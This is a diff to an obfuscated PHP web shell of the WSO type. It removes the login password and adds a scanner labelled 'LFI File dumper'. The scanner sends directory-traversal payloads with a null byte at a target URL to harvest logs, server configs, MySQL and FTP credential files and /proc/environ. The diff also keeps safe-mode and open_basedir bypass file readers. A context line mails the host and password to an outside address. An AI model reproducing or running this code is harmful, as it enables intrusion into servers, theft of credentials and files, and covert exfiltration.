@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'wso', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "63a9f0ea7bb98050796b649e85481845"; //root
+$▛ = ""; //root | 63a9f0ea7bb98050796b649e85481845
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'SecInfo';
@@ -175,10 +175,11 @@ function _Header() {
 		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
 	}
 	function sr(url, params) {
+			//if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
 		if (window.XMLHttpRequest)
 			req = new XMLHttpRequest();
 		else if (window.ActiveXObject)
-			req = new ActiveXObject('▟.XMLHTTP');
+			req = new ActiveXObject('Microsoft.XMLHTTP');
         if (req) {
             req.onreadystatechange = processReqChange;
             req.open('POST', url, true);
@@ -247,7 +248,7 @@ function _Header() {
 	$opt_charsets = '';
 	foreach($charsets as $▟)
 		$opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
-	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
+	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
 	if(!empty($GLOBALS['▛']))
 	$m['Logout'] = 'Logout';
 	$menu = '';
@@ -500,7 +501,422 @@ function actionSecInfo() {
 			echo '<br /><b>[-] Error: /etc/passwd file does not exist</b><br /><br />';
 		}
     }
-    echo '</div>';
+   
+	echo '</div>';
+
+	print '
+	   <h1>Led-Zeppelin\'s LFI File dumper</h1><div class=content><br>
+	   <form method="post" action="?"><input type="hidden" name="a" value="lfiscan">LFI URL: <input type="text" size="70" name="lfiurl" value="">
+	   <input type="submit" value="Go"> File: <select name="scantype">
+			 <option value="1">
+				Access Log
+			 </option>
+	
+			 <option value="2">
+				httpd.conf
+			 </option>
+	
+			 <option value="3">
+				Error Log
+			 </option>
+			 <option value="4">
+				php.ini
+			 </option>
+			 <option value="5">
+				MySQL
+			 </option>
+			 <option value="6">
+				FTP
+			 </option>
+			 <option value="7">
+				Environ
+			 </option>
+		  </select> Null: <select name="null">
+			 <option value="%00">
+				Yes
+			 </option>
+	
+			 <option value="">
+				No
+			 </option>
+		  </select> User-Agent: <input type="text" size="20" name="custom_header" value="">
+	   </form><br>';
+	   echo '<table><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><tr><td style="width:140px;">Copy (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><tr><td style="width:140px;">Glob (list dir):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><tr><td style="width:140px;">Curl (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><tr><td style="width:140px;">Ini_restore (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
+	<table><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><tr><td style="width:140px;">Imap_open (read file):</td><td><input type=text name=param><input type=submit value="submit"></form></table>
+	<br>
+	Posix_getpwuid ("Read" /etc/passwd)
+	<table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000>
+	<tr><td></td><td><input type=submit value="submit"></td></tr></form></table>';
+	echo '</div>'; 
+	echo '<div class=content>'; 
+	error_reporting(0);
+	if($_POST['lfiurl']) {
+	print "<pre>";
+	$cheader = $_POST['custom_header'];
+	$target = $_POST['lfiurl'];
+	$type = $_POST['scantype'];
+	$byte1 = $_POST['null'];
+	$lfitest = "../../../../../../../../../../../../../../etc/passwd".$byte1."";
+	$lfitest2 = "../../../../../../../../../../../../../../fake/file".$byte1."";
+	$lfiprocenv = "../../../../../../../../../../../../../../proc/environ".$byte1."";
+	$lfiaccess = array(
+	1 =>"../../../../../../../../../../../../../../apache/logs/access.log".$byte1."",
+	2 =>"../../../../../../../../../../../../../../etc/httpd/logs/acces_log".$byte1."",
+	3 =>"../../../../../../../../../../../../../../etc/httpd/logs/acces.log".$byte1."",
+	4 =>"../../../../../../../../../../../../../../var/www/logs/access_log".$byte1."",
+	5 =>"../../../../../../../../../../../../../../var/www/logs/access.log".$byte1."",
+	6 =>"../../../../../../../../../../../../../../usr/local/apache/logs/access_log".$byte1."",
+	7 =>"../../../../../../../../../../../../../../usr/local/apache/logs/access.log".$byte1."",
+	8 =>"../../../../../../../../../../../../../../var/log/apache/access_log".$byte1."",
+	9 =>"../../../../../../../../../../../../../../var/log/apache2/access_log".$byte1."",
+	10 =>"../../../../../../../../../../../../../../var/log/apache/access.log".$byte1."",
+	11 =>"../../../../../../../../../../../../../../var/log/apache2/access.log".$byte1."",
+	12 =>"../../../../../../../../../../../../../../var/log/access_log".$byte1."",
+	13 =>"../../../../../../../../../../../../../../var/log/access.log".$byte1."",
+	14 =>"../../../../../../../../../../../../../../var/log/httpd/access_log".$byte1."",
+	15 =>"../../../../../../../../../../../../../../apache2/logs/access.log".$byte1."",
+	16 =>"../../../../../../../../../../../../../../logs/access.log".$byte1."",
+	17 =>"../../../../../../../../../../../../../../usr/local/apache2/logs/access_log".$byte1."",
+	18 =>"../../../../../../../../../../../../../../usr/local/apache2/logs/access.log".$byte1."",
+	19 =>"../../../../../../../../../../../../../../var/log/httpd/access.log".$byte1."",
+	20 =>"../../../../../../../../../../../../../../opt/lampp/logs/access_log".$byte1."",
+	21 =>"../../../../../../../../../../../../../../opt/xampp/logs/access_log".$byte1."",
+	22 =>"../../../../../../../../../../../../../../opt/lampp/logs/access.log".$byte1."",
+	23 =>"../../../../../../../../../../../../../../opt/xampp/logs/access.log".$byte1."");
+	$lfierror = array(
+	1 =>"../../../../../../../../../../../../../../apache/logs/error.log".$byte1."",
+	2 =>"../../../../../../../../../../../../../../etc/httpd/logs/error_log".$byte1."",
+	3 =>"../../../../../../../../../../../../../../etc/httpd/logs/error.log".$byte1."",
+	4 =>"../../../../../../../../../../../../../../var/www/logs/error_log".$byte1."",
+	5 =>"../../../../../../../../../../../../../../var/www/logs/error.log".$byte1."",
+	6 =>"../../../../../../../../../../../../../../usr/local/apache/logs/error_log".$byte1."",
+	7 =>"../../../../../../../../../../../../../../usr/local/apache/logs/error.log".$byte1."",
+	8 =>"../../../../../../../../../../../../../../var/log/apache/error_log".$byte1."",
+	9 =>"../../../../../../../../../../../../../../var/log/apache2/error_log".$byte1."",
+	10 =>"../../../../../../../../../../../../../../var/log/apache/error.log".$byte1."",
+	11 =>"../../../../../../../../../../../../../../var/log/apache2/error.log".$byte1."",
+	12 =>"../../../../../../../../../../../../../../var/log/error_log".$byte1."",
+	13 =>"../../../../../../../../../../../../../../var/log/error.log".$byte1."",
+	14 =>"../../../../../../../../../../../../../../var/log/httpd/error_log".$byte1."",
+	15 =>"../../../../../../../../../../../../../../apache2/logs/error.log".$byte1."",
+	16 =>"../../../../../../../../../../../../../../logs/error.log".$byte1."",
+	17 =>"../../../../../../../../../../../../../../usr/local/apache2/logs/error_log".$byte1."",
+	18 =>"../../../../../../../../../../../../../../usr/local/apache2/logs/error.log".$byte1."",
+	19 =>"../../../../../../../../../../../../../../var/log/httpd/error.log".$byte1."",
+	20 =>"../../../../../../../../../../../../../../opt/lampp/logs/error_log".$byte1."",
+	21 =>"../../../../../../../../../../../../../../opt/xampp/logs/error_log".$byte1."",
+	22 =>"../../../../../../../../../../../../../../opt/lampp/logs/error.log".$byte1."",
+	23 =>"../../../../../../../../../../../../../../opt/xampp/logs/error.log".$byte1."");
+	$lficonfig = array(
+	1 =>"../../../../../../../../../../../../../../../usr/local/apache/conf/httpd.conf".$byte1."",
+	2 =>"../../../../../../../../../../../../../../../usr/local/apache2/conf/httpd.conf".$byte1."",
+	3 =>"../../../../../../../../../../../../../../../etc/httpd/conf/httpd.conf".$byte1."",
+	4 =>"../../../../../../../../../../../../../../../etc/apache/conf/httpd.conf".$byte1."",
+	5 =>"../../../../../../../../../../../../../../../usr/local/etc/apache/conf/httpd.conf".$byte1."",
+	6 =>"../../../../../../../../../../../../../../../etc/apache2/httpd.conf".$byte1."",
+	7 =>"../../../../../../../../../../../../../../../usr/local/apache/httpd.conf".$byte1."",
+	8 =>"../../../../../../../../../../../../../../../usr/local/apache2/httpd.conf".$byte1."",
+	9 =>"../../../../../../../../../../../../../../../usr/local/httpd/conf/httpd.conf".$byte1."",
+	10 =>"../../../../../../../../../../../../../../../usr/local/etc/apache2/conf/httpd.conf".$byte1."",
+	11 =>"../../../../../../../../../../../../../../../usr/local/etc/httpd/conf/httpd.conf".$byte1."",
+	12 =>"../../../../../../../../../../../../../../../usr/apache2/conf/httpd.conf".$byte1."",
+	13 =>"../../../../../../../../../../../../../../../usr/apache/conf/httpd.conf".$byte1."",
+	14 =>"../../../../../../../../../../../../../../../usr/local/apps/apache2/conf/httpd.conf".$byte1."",
+	15 =>"../../../../../../../../../../../../../../../usr/local/apps/apache/conf/httpd.conf".$byte1."",
+	16 =>"../../../../../../../../../../../../../../../etc/apache2/conf/httpd.conf".$byte1."",
+	17 =>"../../../../../../../../../../../../../../../etc/http/conf/httpd.conf".$byte1."",
+	18 =>"../../../../../../../../../../../../../../../etc/httpd/httpd.conf".$byte1."",
+	19 =>"../../../../../../../../../../../../../../../etc/http/httpd.conf".$byte1."",
+	20 =>"../../../../../../../../../../../../../../../etc/httpd.conf".$byte1."",
+	21 =>"../../../../../../../../../../../../../../../opt/apache/conf/httpd.conf".$byte1."",
+	22 =>"../../../../../../../../../../../../../../../opt/apache2/conf/httpd.conf".$byte1."",
+	23 =>"../../../../../../../../../../../../../../../var/www/conf/httpd.conf".$byte1."",
+	24 =>"../../../../../../../../../../../../../../../private/etc/httpd/httpd.conf".$byte1."",
+	25 =>"../../../../../../../../../../../../../../../private/etc/httpd/httpd.conf.default".$byte1."",
+	26 =>"../../../../../../../../../../../../../../../Volumes/webBackup/opt/apache2/conf/httpd.conf".$byte1."",
+	27 =>"../../../../../../../../../../../../../../../Volumes/webBackup/private/etc/httpd/httpd.conf".$byte1."",
+	28 =>"../../../../../../../../../../../../../../../Volumes/webBackup/private/etc/httpd/httpd.conf.default".$byte1."",
+	29 =>"../../../../../../../../../../../../../../../usr/local/php/httpd.conf.php".$byte1."",
+	30 =>"../../../../../../../../../../../../../../../usr/local/php4/httpd.conf.php".$byte1."",
+	31 =>"../../../../../../../../../../../../../../../usr/local/php5/httpd.conf.php".$byte1."",
+	32 =>"../../../../../../../../../../../../../../../usr/local/php/httpd.conf".$byte1."",
+	33 =>"../../../../../../../../../../../../../../../usr/local/php4/httpd.conf".$byte1."",
+	34 =>"../../../../../../../../../../../../../../../usr/local/php5/httpd.conf".$byte1."",
+	35 =>"../../../../../../../../../../../../../../../usr/local/etc/apache/vhosts.conf".$byte1."");
+	$lfiphpini = array(
+	1 =>"../../../../../../../../../../../../../../../etc/php.ini".$byte1."",
+	2 =>"../../../../../../../../../../../../../../../bin/php.ini".$byte1."",
+	3 =>"../../../../../../../../../../../../../../../etc/httpd/php.ini".$byte1."",
+	4 =>"../../../../../../../../../../../../../../../usr/lib/php.ini".$byte1."",
+	5 =>"../../../../../../../../../../../../../../../usr/lib/php/php.ini".$byte1."",
+	6 =>"../../../../../../../../../../../../../../../usr/local/etc/php.ini".$byte1."",
+	7 =>"../../../../../../../../../../../../../../../usr/local/lib/php.ini".$byte1."",
+	8 =>"../../../../../../../../../../../../../../../usr/local/php/lib/php.ini".$byte1."",
+	9 =>"../../../../../../../../../../../../../../../usr/local/php4/lib/php.ini".$byte1."",
+	10 =>"../../../../../../../../../../../../../../../usr/local/php5/lib/php.ini".$byte1."",
+	11 =>"../../../../../../../../../../../../../../../usr/local/apache/conf/php.ini".$byte1."",
+	12 =>"../../../../../../../../../../../../../../../etc/php4.4/fcgi/php.ini".$byte1."",
+	13 =>"../../../../../../../../../../../../../../../etc/php4/apache/php.ini".$byte1."",
+	14 =>"../../../../../../../../../../../../../../../etc/php4/apache2/php.ini".$byte1."",
+	15 =>"../../../../../../../../../../../../../../../etc/php5/apache/php.ini".$byte1."",
+	16 =>"../../../../../../../../../../../../../../../etc/php5/apache2/php.ini".$byte1."",
+	17 =>"../../../../../../../../../../../../../../../etc/php/php.ini".$byte1."",
+	18 =>"../../../../../../../../../../../../../../../etc/php/php4/php.ini".$byte1."",
+	19 =>"../../../../../../../../../../../../../../../etc/php/apache/php.ini".$byte1."",
+	20 =>"../../../../../../../../../../../../../../../etc/php/apache2/php.ini".$byte1."",
+	21 =>"../../../../../../../../../../../../../../../web/conf/php.ini".$byte1."",
+	22 =>"../../../../../../../../../../../../../../../usr/local/Zend/etc/php.ini".$byte1."",
+	23 =>"../../../../../../../../../../../../../../../opt/xampp/etc/php.ini".$byte1."",
+	24 =>"../../../../../../../../../../../../../../../var/local/www/conf/php.ini".$byte1."",
+	25 =>"../../../../../../../../../../../../../../../etc/php/cgi/php.ini".$byte1."",
+	26 =>"../../../../../../../../../../../../../../../etc/php4/cgi/php.ini".$byte1."",
+	27 =>"../../../../../../../../../../../../../../../etc/php5/cgi/php.ini".$byte1."");
+	$lfimysql = array(
+	1 =>"../../../../../../../../../../../../../../../var/log/mysql/mysql-bin.log".$byte1."",
+	2 =>"../../../../../../../../../../../../../../../var/log/mysql.log".$byte1."",
+	3 =>"../../../../../../../../../../../../../../../var/log/mysqlderror.log".$byte1."",
+	4 =>"../../../../../../../../../../../../../../../var/log/mysql/mysql.log".$byte1."",
+	5 =>"../../../../../../../../../../../../../../../var/log/mysql/mysql-slow.log".$byte1."",
+	6 =>"../../../../../../../../../../../../../../../var/mysql.log".$byte1."",
+	7 =>"../../../../../../../../../../../../../../../var/lib/mysql/my.cnf".$byte1."",
+	8 =>"../../../../../../../../../../../../../../../etc/mysql/my.cnf".$byte1."",
+	9 =>"../../../../../../../../../../../../../../../var/log/mysqld.log".$byte1."",
+	10 =>"../../../../../../../../../../../../../../../etc/my.cnf".$byte1."");
+	$lfiftp = array(
+	1 =>"../../../../../../../../../../../../../../../etc/logrotate.d/proftpd".$byte1."",
+	2 =>"../../../../../../../../../../../../../../../www/logs/proftpd.system.log".$byte1."",
+	3 =>"../../../../../../../../../../../../../../../var/log/proftpd".$byte1."",
+	4 =>"../../../../../../../../../../../../../../../etc/proftp.conf".$byte1."",
+	5 =>"../../../../../../../../../../../../../../../etc/protpd/proftpd.conf".$byte1."",
+	6 =>"../../../../../../../../../../../../../../../etc/vhcs2/proftpd/proftpd.conf".$byte1."",
+	7 =>"../../../../../../../../../../../../../../../etc/proftpd/modules.conf".$byte1."",
+	8 =>"../../../../../../../../../../../../../../../var/log/vsftpd.log".$byte1."",
+	9 =>"../../../../../../../../../../../../../../../etc/vsftpd.chroot_list".$byte1."",
+	10 =>"../../../../../../../../../../../../../../../etc/logrotate.d/vsftpd.log".$byte1."",
+	11 =>"../../../../../../../../../../../../../../../etc/vsftpd/vsftpd.conf".$byte1."",
+	12 =>"../../../../../../../../../../../../../../../etc/vsftpd.conf".$byte1."",
+	13 =>"../../../../../../../../../../../../../../../etc/chrootUsers".$byte1."",
+	14 =>"../../../../../../../../../../../../../../../var/log/xferlog".$byte1."",
+	15 =>"../../../../../../../../../../../../../../../var/adm/log/xferlog".$byte1."",
+	16 =>"../../../../../../../../../../../../../../../etc/wu-ftpd/ftpaccess".$byte1."",
+	17 =>"../../../../../../../../../../../../../../../etc/wu-ftpd/ftphosts".$byte1."",
+	18 =>"../../../../../../../../../../../../../../../etc/wu-ftpd/ftpusers".$byte1."",
+	19 =>"../../../../../../../../../../../../../../../usr/sbin/pure-config.pl".$byte1."",
+	20 =>"../../../../../../../../../../../../../../../usr/etc/pure-ftpd.conf".$byte1."",
+	21 =>"../../../../../../../../../../../../../../../etc/pure-ftpd/pure-ftpd.conf".$byte1."",
+	22 =>"../../../../../../../../../../../../../../../usr/local/etc/pure-ftpd.conf".$byte1."",
+	23 =>"../../../../../../../../../../../../../../../usr/local/etc/pureftpd.pdb".$byte1."",
+	24 =>"../../../../../../../../../../../../../../../usr/local/pureftpd/etc/pureftpd.pdb".$byte1."",
+	25 =>"../../../../../../../../../../../../../../../usr/local/pureftpd/sbin/pure-config.pl".$byte1."",
+	26 =>"../../../../../../../../../../../../../../../usr/local/pureftpd/etc/pure-ftpd.conf".$byte1."",
+	27 =>"../../../../../../../../../../../../../../../etc/pure-ftpd.conf".$byte1."",
+	28 =>"../../../../../../../../../../../../../../../etc/pure-ftpd/pure-ftpd.pdb".$byte1."",
+	29 =>"../../../../../../../../../../../../../../../etc/pureftpd.pdb".$byte1."",
+	30 =>"../../../../../../../../../../../../../../../etc/pureftpd.passwd".$byte1."",
+	31 =>"../../../../../../../../../../../../../../../etc/pure-ftpd/pureftpd.pdb".$byte1."",
+	32 =>"../../../../../../../../../../../../../../../usr/ports/ftp/pure-ftpd/".$byte1."",
+	33 =>"../../../../../../../../../../../../../../../usr/ports/net/pure-ftpd/".$byte1."",
+	34 =>"../../../../../../../../../../../../../../../usr/pkgsrc/net/pureftpd/".$byte1."",
+	35 =>"../../../../../../../../../../../../../../../usr/ports/contrib/pure-ftpd/".$byte1."",
+	36 =>"../../../../../../../../../../../../../../../var/log/pure-ftpd/pure-ftpd.log".$byte1."",
+	37 =>"../../../../../../../../../../../../../../../logs/pure-ftpd.log".$byte1."",
+	38 =>"../../../../../../../../../../../../../../../var/log/pureftpd.log".$byte1."",
+	39 =>"../../../../../../../../../../../../../../../var/log/ftp-proxy/ftp-proxy.log".$byte1."",
+	40 =>"../../../../../../../../../../../../../../../var/log/ftp-proxy".$byte1."",
+	41 =>"../../../../../../../../../../../../../../../var/log/ftplog".$byte1."",
+	42 =>"../../../../../../../../../../../../../../../etc/logrotate.d/ftp".$byte1."",
+	43 =>"../../../../../../../../../../../../../../../etc/ftpchroot".$byte1."",
+	44 =>"../../../../../../../../../../../../../../../etc/ftphosts".$byte1."");
+	$x = 1;
+	if ( $type == 1 ) {
+	$res1 = FetchURL($target.$lfitest);
+	$res2 = FetchURL($target.$lfitest2);
+	$rhash1 = md5($res1);
+	$rhash2 = md5($res2);
+	if ($rhash1 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
+		while($lfiaccess[$x]) {
+		$res3 = FetchURL($target.$lfiaccess[$x]);
+		$rhash3 = md5($res3);
+		if ($rhash3 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] File detected!</font> <a href=\"".$target."".$lfiaccess[$x]."\">".$target."".$lfiaccess[$x]."</a><br  />";
+		}
+		else {
+		print "<font color='red'>[!] Failed!</font>".$target."".$lfiaccess[$x]."<br  />";
+		}
+		$x++;
+		}
+	}
+	}
+	if ( $type == 2 ) {
+	$res1 = FetchURL($target.$lfitest);
+	$res2 = FetchURL($target.$lfitest2);
+	$rhash1 = md5($res1);
+	$rhash2 = md5($res2);
+	if ($rhash1 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
+		while($lficonfig[$x]) {
+		$res3 = FetchURL($target.$lficonfig[$x]);
+		$rhash3 = md5($res3);
+		if ($rhash3 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] File detected!</font> <a href=\"".$target."".$lficonfig[$x]."\">".$target."".$lficonfig[$x]."</a><br  />";
+		}
+		else {
+		print "<font color='red'>[!] Failed!</font>".$target."".$lficonfig[$x]."<br  />";
+		}
+		$x++;
+		}
+	}
+	}
+	if ( $type == 3 ) {
+	$res1 = FetchURL($target.$lfitest);
+	$res2 = FetchURL($target.$lfitest2);
+	$rhash1 = md5($res1);
+	$rhash2 = md5($res2);
+	if ($rhash1 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
+		while($lfierror[$x]) {
+			$res3 = FetchURL($target.$lfierror[$x]);
+			$rhash3 = md5($res3);
+			if ($rhash3 != $rhash2) {
+				print "<font color='#FFDB5F'>[+] File detected!</font> <a href=\"".$target."".$lfierror[$x]."\">".$target."".$lfierror[$x]."</a><br  />";
+			}
+			else {
+				print "<font color='red'>[!] Failed!</font>".$target."".$lfierror[$x]."<br  />";
+			}
+			$x++;
+			}
+		}
+	}
+	if ( $type == 4 ) {
+	$res1 = FetchURL($target.$lfitest);
+	$res2 = FetchURL($target.$lfitest2);
+	$rhash1 = md5($res1);
+	$rhash2 = md5($res2);
+	if ($rhash1 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
+		while($lfiphpini[$x]) {
+			$res3 = FetchURL($target.$lfiphpini[$x]);
+			$rhash3 = md5($res3);
+			if ($rhash3 != $rhash2) {
+				print "<font color='#FFDB5F'>[+] File detected!</font> <a href=\"".$target."".$lfiphpini[$x]."\">".$target."".$lfiphpini[$x]."</a><br  />";
+			}
+			else {
+				print "<font color='red'>[!] Failed!</font>".$target."".$lfiphpini[$x]."<br  />";
+			}
+			$x++;
+		}
+	}
+	}
+	if ( $type == 5 ) {
+	$res1 = FetchURL($target.$lfitest);
+	$res2 = FetchURL($target.$lfitest2);
+	$rhash1 = md5($res1);
+	$rhash2 = md5($res2);
+	if ($rhash1 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
+		while($lfimysql[$x]) {
+			$res3 = FetchURL($target.$lfimysql[$x]);
+			$rhash3 = md5($res3);
+			if ($rhash3 != $rhash2) {
+				print "<font color='#FFDB5F'>[+] File detected!</font> <a href=\"".$target."".$lfimysql[$x]."\">".$target."".$lfimysql[$x]."</a><br  />";
+			}
+			else {
+				print "<font color='red'>[!] Failed!</font>".$target."".$lfimysql[$x]."<br  />";
+			}
+			$x++;
+			}
+		}
+	}
+	if ( $type == 6 ) {
+	$res1 = FetchURL($target.$lfitest);
+	$res2 = FetchURL($target.$lfitest2);
+	$rhash1 = md5($res1);
+	$rhash2 = md5($res2);
+	if ($rhash1 != $rhash2) {
+		print "<font color='#FFDB5F'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
+		while($lfiftp[$x]) {
+			$res3 = FetchURL($target.$lfiftp[$x]);
+			$rhash3 = md5($res3);
+			if ($rhash3 != $rhash2) {
+				print "<font color='#FFDB5F'>[+] File detected!</font> <a href=\"".$target."".$lfiftp[$x]."\">".$target."".$lfiftp[$x]."</a><br  />";
+			}
+			else {
+				print "<font color='red'>[!] Failed!</font>".$target."".$lfiftp[$x]."<br  />";
+			}
+			$x++;
+			}
+		}
+	}
+	if ( $type == 7 ) {
+		$res1 = FetchURL($target.$lfitest);
+		$res2 = FetchURL($target.$lfitest2);
+		$rhash1 = md5($res1);
+		$rhash2 = md5($res2);
+		if ($rhash1 != $rhash2) {
+			print "<font color='#FFDB5F'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";{
+			$res3 = FetchURL($target.$lfiprocenv);
+			$rhash3 = md5($res3);
+			if ($rhash3 != $rhash2) {
+				print "<font color='#FFDB5F'>[+] File detected!</font> <a href=\"".$target."".$lfiprocenv."\">".$target."".$lfiprocenv."</a><br  />";
+			}
+			else {
+				print "<font color='red'>[!] Failed!</font>".$target."".$lfiprocenv."<br  />";
+			}
+			}
+		}
+	}
+	}
+	echo '</div>';
+
+	$temp=''; 
+    ob_start(); 
+    switch($_POST['p1']) { 
+        case 1: 
+            $temp=@tempnam($test, 'cx'); 
+            if(@copy("compress.zlib://".$_POST['p2'], $temp)){ 
+                echo @file_get_contents($temp); 
+                unlink($temp); 
+            } else 
+                echo 'Sorry... Can\'t open file'; 
+            break; 
+        case 2: 
+            $files = glob($_POST['p2'].'*'); 
+            if( is_array($files) ) 
+                foreach ($files as $filename) 
+                    echo $filename."\n"; 
+            break; 
+        case 3: 
+            $ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH); 
+            curl_exec($ch); 
+            break; 
+        case 4: 
+            ini_restore("safe_mode"); 
+            ini_restore("open_basedir"); 
+            include($_POST['p2']); 
+            break; 
+        case 5: 
+            for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) { 
+                $uid = @posix_getpwuid($_POST['p2']); 
+                if ($uid) 
+                    echo join(':',$uid)."\n"; 
+            } 
+            break; 
+        case 6: 
+            if(!function_exists('imap_open'))break; 
+            $stream = imap_open($_POST['p2'], "", ""); 
+            if ($stream == FALSE) 
+                break; 
+            echo imap_body($stream, 1); 
+            imap_close($stream); 
+            break; 
+    } 
+    $temp = ob_get_clean(); 
+	if($temp) 
+        echo '<div class=content><pre class="ml1" id="Output">'.$temp.'</pre></div><br>';  
 
 	_Footer();
 }
@@ -1146,68 +1562,6 @@ function actionStringTools() {
 		</form></div>";
 	_Footer();
 }
-function actionSafeMode() { 
-    $temp=''; 
-    ob_start(); 
-    switch($_POST['p1']) { 
-        case 1: 
-            $temp=@tempnam($test, 'cx'); 
-            if(@copy("compress.zlib://".$_POST['p2'], $temp)){ 
-                echo @file_get_contents($temp); 
-                unlink($temp); 
-            } else 
-                echo 'Sorry... Can\'t open file'; 
-            break; 
-        case 2: 
-            $files = glob($_POST['p2'].'*'); 
-            if( is_array($files) ) 
-                foreach ($files as $filename) 
-                    echo $filename."\n"; 
-            break; 
-        case 3: 
-            $ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH); 
-            curl_exec($ch); 
-            break; 
-        case 4: 
-            ini_restore("safe_mode"); 
-            ini_restore("open_basedir"); 
-            include($_POST['p2']); 
-            break; 
-        case 5: 
-            for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) { 
-                $uid = @posix_getpwuid($_POST['p2']); 
-                if ($uid) 
-                    echo join(':',$uid)."\n"; 
-            } 
-            break; 
-        case 6: 
-            if(!function_exists('imap_open'))break; 
-            $stream = imap_open($_POST['p2'], "", ""); 
-            if ($stream == FALSE) 
-                break; 
-            echo imap_body($stream, 1); 
-            imap_close($stream); 
-            break; 
-    } 
-    $temp = ob_get_clean(); 
-    _Header(); 
-    echo '<h1>Safe mode bypass</h1><div class=content>'; 
-    echo '
-	<table><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><tr><td style="width:140px;">Copy (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><tr><td style="width:140px;">Glob (list dir):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><tr><td style="width:140px;">Curl (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><tr><td style="width:140px;">Ini_restore (read file):</td><td><input class="toolsInp" type=text name=param><input type=submit value="submit"></form></table>
-	<table><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><tr><td style="width:140px;">Imap_open (read file):</td><td><input type=text name=param><input type=submit value="submit"></form></table>
-	<br>
-	Posix_getpwuid ("Read" /etc/passwd)
-	<table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000>
-	<tr><td></td><td><input type=submit value="submit"></td></tr></form></table>';
-	echo '</div>'; 
-	if($temp) 
-        echo '<div class=content><pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre></div>'; 
-    _Footer(); 
-} 
-
 function actionBruteforce() {
 	_Header();
 	if( isset($_POST['proto']) ) {
@@ -1377,7 +1731,22 @@ if( empty($_POST['a']) )
 	if(isset($▚) && function_exists('action' . $▚))
 		$_POST['a'] = $▚;
 	else
-		$_POST['a'] = 'FilesMan';
+		$_POST['a'] = 'SecInfo';
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
 	call_user_func('action' . $_POST['a']);
+	function FetchURL($url) {
+		$ch = curl_init();
+		curl_setopt($ch,CURLOPT_USERAGENT,"$cheader");
+		curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
+		curl_setopt($ch,CURLOPT_HEADER,false);
+		curl_setopt($ch,CURLOPT_URL,$url);
+		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+		curl_setopt($ch,CURLOPT_TIMEOUT,30);
+		$data = curl_exec($ch);
+		if(!$data) {
+		return false;
+		}
+		return $data;
+	}
+	exit;
 ?>
